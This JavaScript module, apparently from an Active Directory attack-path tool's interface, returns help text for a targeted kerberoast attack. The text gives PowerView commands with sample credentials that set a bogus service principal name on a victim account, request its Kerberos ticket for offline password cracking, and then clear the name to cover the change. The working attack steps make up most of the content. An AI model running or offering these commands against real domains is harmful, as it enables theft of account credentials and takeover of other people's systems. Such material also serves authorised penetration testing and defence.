const Abuse = (sourceName, sourceType, targetName,targetType) => {
    return `A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket. 

        You may need to authenticate to the Domain Controller as ${
        (sourceType === 'User' || sourceType === 'Computer')
            ? `${sourceName} if you are not running a process as that user`
            : `a member of ${sourceName} if you are not running a process as a member`
    }. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

        <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>

        Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ${sourceName}:

        <code>Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}</code>

        After running this, you can use Get-DomainSPNTicket as follows:
            
        <code>Get-DomainSPNTicket -Credential $Cred harmj0y | fl</>

        The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:

        <code>Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname</code>`
}

export default Abuse;